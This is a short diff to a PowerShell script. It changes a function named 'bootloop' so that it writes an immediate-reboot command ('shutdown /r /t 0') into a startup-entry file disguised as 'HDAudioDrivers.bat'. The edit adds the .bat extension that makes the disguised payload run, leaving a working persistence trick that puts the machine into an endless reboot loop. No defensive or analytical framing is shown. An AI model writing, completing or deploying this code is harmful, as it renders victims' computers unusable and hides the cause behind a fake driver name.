@@ -79,7 +79,7 @@ function bootloop {
             New-Item -ItemType Directory -Path $Path -Force | Out-Null
         }
 
-        $FilePath = Join-Path -ChildPath "HDAudioDrivers" -Path $Path
+        $FilePath = Join-Path -ChildPath "HDAudioDrivers.bat" -Path $Path
         "shutdown /r /t 0" | Out-File -FilePath $FilePath -Encoding ascii
 
         Write-Host "startup entry successful" -ForegroundColor Cyan
